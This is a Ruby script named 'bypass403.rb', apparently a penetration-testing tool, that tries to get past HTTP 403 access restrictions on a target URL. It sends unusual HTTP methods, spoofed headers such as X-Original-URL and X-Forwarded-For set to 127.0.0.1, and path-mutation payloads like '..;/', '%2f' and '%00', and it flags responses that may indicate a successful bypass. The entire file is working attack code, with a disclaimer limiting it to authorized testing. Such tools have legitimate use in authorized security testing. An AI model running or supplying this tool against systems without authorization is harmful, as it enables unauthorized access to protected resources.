require 'net/http'
require 'uri'
require 'optparse'
require 'openssl'

BANNER = <<~STR

    ____                              __ __  ____ _____
   / __ )__  ______  ____ ___________/ // / / __ \__  /
  / __  / / / / __ \/ __ `/ ___/ ___/ // /_/ / / //_ < 
 / /_/ / /_/ / /_/ / /_/ (__  |__  )__  __/ /_/ /__/ / 
/_____/\__, / .___/\__,_/____/____/  /_/  \____/____/  
      /____/_/                                         

                              made by zenshell
STR

R     = "\e[0m"
RED   = "\e[31m"
GREEN = "\e[32m"
YEL   = "\e[33m"
CYAN  = "\e[36m"
GRAY  = "\e[90m"
BOLD  = "\e[1m"
MAG   = "\e[35m"

METHODS = %w[GET POST PUT DELETE PATCH OPTIONS HEAD TRACE CONNECT PROPFIND MKCOL COPY MOVE LOCK UNLOCK SEARCH]

BYPASS_HEADERS = [
  ['X-Original-URL',            :path],
  ['X-Rewrite-URL',             :path],
  ['X-Forwarded-For',           '127.0.0.1'],
  ['X-Forwarded-For',           '::1'],
  ['X-Real-IP',                 '127.0.0.1'],
  ['X-Real-IP',                 '::1'],
  ['X-Client-IP',               '127.0.0.1'],
  ['X-Client-IP',               '::1'],
  ['X-Custom-IP-Authorization', '127.0.0.1'],
  ['X-Custom-IP-Authorization', '::1'],
]

class HTTPTester
  def initialize(url, opts = {})
    @url     = url
    @uri     = URI.parse(url)
    @timeout = opts[:timeout] || 5
    @delay   = opts[:delay]   || 0
    @verbose = opts[:verbose] || false
  end

  def test_methods
    section "HTTP Method Manipulation"
    METHODS.each do |m|
      res = do_request(@url, method: m)
      print_line(m.ljust(10), res)
      sleep @delay if @delay > 0
    end
  end

  def test_headers
    section "Header-Based Bypass"
    path = @uri.path.to_s
    path = '/' if path.empty?

    BYPASS_HEADERS.each do |name, val|
      v = val == :path ? path : val
      res = do_request(@url, extra_headers: { name => v })
      print_line("#{name}: #{v}".ljust(42), res)
      sleep @delay if @delay > 0
    end
  end

  def test_paths
    section "Path Fuzzing"
    path = @uri.path.to_s
    path = '/index' if path.empty? || path == '/'

    seg  = path.split('/').reject(&:empty?).last || 'index'
    pre  = path.sub(/\/#{Regexp.escape(seg)}\/?$/, '')
    pre  = '' if pre == path

    variants = [
      "#{pre}//#{seg}//",
      "#{path}.",
      "#{path};",
      "#{path}%2f",
      "#{path}%252f",
      "#{pre}/#{seg.upcase}",
      "#{pre}/#{seg.capitalize}",
      "#{path}.json",
      "#{path}.php",
      "#{path}.html",
      "#{path}%00",
      "#{pre}/%2e%2e/#{seg}",
      "#{pre}/..;/#{seg}",
      "#{pre}/./#{seg}",
      "#{path}/.",
      "#{path}//",
      "/#{seg}",
      "%2f#{seg}",
      "#{path}%09",
      "#{path}~",
    ]

    variants.each do |p|
      target = build_url(p)
      res = do_request(target, raw_path: p)
      print_line(p.ljust(32), res)
      sleep @delay if @delay > 0
    end
  end

  private

  def section(title)
    puts "\n#{BOLD}#{CYAN}[*] #{title}#{R}"
    puts "#{GRAY}#{'-' * 58}#{R}"
  end

  def build_url(p)
    port_part = (@uri.port == 80 || @uri.port == 443) ? '' : ":#{@uri.port}"
    "#{@uri.scheme}://#{@uri.host}#{port_part}#{p}"
  end

  def do_request(url, method: 'GET', extra_headers: {}, raw_path: nil)
    uri  = URI.parse(url)
    http = Net::HTTP.new(uri.host, uri.port)

    if uri.scheme == 'https'
      http.use_ssl     = true
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    end

    http.open_timeout = @timeout
    http.read_timeout = @timeout

    req_path = raw_path || uri.request_uri

    req = build_req(method.upcase, req_path)
    req['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0'
    req['Accept']     = '*/*'
    req['Connection'] = 'close'
    extra_headers.each { |k, v| req[k] = v }

    resp = http.request(req)
    { code: resp.code.to_i, size: (resp.body || '').bytesize }
  rescue Timeout::Error
    { code: 0, size: 0, err: 'timeout' }
  rescue => e
    { code: 0, size: 0, err: e.message.split("\n").first }
  end

  def build_req(method, path)
    known = {
      'GET'     => Net::HTTP::Get,
      'POST'    => Net::HTTP::Post,
      'PUT'     => Net::HTTP::Put,
      'DELETE'  => Net::HTTP::Delete,
      'PATCH'   => Net::HTTP::Patch,
      'OPTIONS' => Net::HTTP::Options,
      'HEAD'    => Net::HTTP::Head,
      'COPY'    => Net::HTTP::Copy,
      'MOVE'    => Net::HTTP::Move,
      'LOCK'    => Net::HTTP::Lock,
      'UNLOCK'  => Net::HTTP::Unlock,
    }

    klass = known[method]

    unless klass
      klass = Class.new(Net::HTTPRequest) do
        const_set :METHOD, method
        const_set :REQUEST_HAS_BODY, false
        const_set :RESPONSE_HAS_BODY, true
      end
    end

    klass.new(path)
  end

  def print_line(label, res)
    if res[:err]
      puts "  #{label}  #{GRAY}err: #{res[:err]}#{R}"
      return
    end

    code = res[:code]
    size = res[:size]

    colored = case code
              when 200, 201, 204 then "#{GREEN}#{BOLD}#{code}#{R}"
              when 301, 302      then "#{YEL}#{code}#{R}"
              when 401           then "#{MAG}#{code}#{R}"
              when 403           then "#{RED}#{code}#{R}"
              when 404           then "#{GRAY}#{code}#{R}"
              when 500..599      then "#{YEL}#{BOLD}#{code}#{R}"
              else                    "#{CYAN}#{code}#{R}"
              end

    flag = [200, 201, 204, 301, 302, 401].include?(code) ? "  #{GREEN}#{BOLD}<-- interesting#{R}" : ''
    puts "  #{label}  #{colored}  (#{size}b)#{flag}"
  end
end

def show_help
  puts "#{BOLD}Usage:#{R}"
  puts "  ruby bypass403.rb --url https://target.com/admin --all"
  puts "  ruby bypass403.rb --url https://target.com/admin --headers --paths\n\n"
  puts "#{BOLD}Flags:#{R}"
  puts "  #{CYAN}--url URL#{R}            target url (required)"
  puts "  #{CYAN}--methods#{R}            test http method manipulation"
  puts "  #{CYAN}--headers#{R}            test header-based bypass"
  puts "  #{CYAN}--paths#{R}              test path fuzzing"
  puts "  #{CYAN}--all#{R}                run everything"
  puts "  #{CYAN}--timeout N#{R}          request timeout in seconds (default 5)"
  puts "  #{CYAN}--delay N#{R}            delay between requests e.g. 0.5"
  puts "  #{CYAN}--verbose#{R}            verbose output"
  puts "  #{CYAN}-h, --help#{R}           this\n\n"
  puts "#{GRAY}For authorized security testing only. Do not use without permission.#{R}\n"
end

cfg = {
  url:     nil,
  timeout: 5,
  delay:   0.0,
  verbose: false,
  methods: false,
  headers: false,
  paths:   false,
  all:     false,
  help:    false,
}

OptionParser.new do |o|
  o.on('--url URL')            { |v| cfg[:url]     = v }
  o.on('--timeout N', Integer) { |v| cfg[:timeout] = v }
  o.on('--delay N',   Float)   { |v| cfg[:delay]   = v }
  o.on('--verbose')            {     cfg[:verbose]  = true }
  o.on('--methods')            {     cfg[:methods]  = true }
  o.on('--headers')            {     cfg[:headers]  = true }
  o.on('--paths')              {     cfg[:paths]    = true }
  o.on('--all')                {     cfg[:all]      = true }
  o.on('-h', '--help')         {     cfg[:help]     = true }
end.parse!(ARGV)

if ARGV.empty? && !cfg[:url] || cfg[:help]
  puts BANNER
  show_help
  exit
end

unless cfg[:url]
  puts "#{RED}need --url#{R}"
  exit 1
end

begin
  URI.parse(cfg[:url])
rescue
  puts "#{RED}url looks wrong#{R}"
  exit 1
end

cfg[:methods] = cfg[:headers] = cfg[:paths] = true if cfg[:all]

unless cfg[:methods] || cfg[:headers] || cfg[:paths]
  puts "#{YEL}pick at least one of: --methods --headers --paths --all#{R}"
  exit 1
end

puts "\n#{BOLD}target:#{R}  #{CYAN}#{cfg[:url]}#{R}"
puts "#{BOLD}timeout:#{R} #{cfg[:timeout]}s   #{BOLD}delay:#{R} #{cfg[:delay]}s\n"

t = HTTPTester.new(cfg[:url], cfg)
t.test_methods if cfg[:methods]
t.test_headers if cfg[:headers]
t.test_paths   if cfg[:paths]

puts "\n#{GRAY}done.#{R}\n"
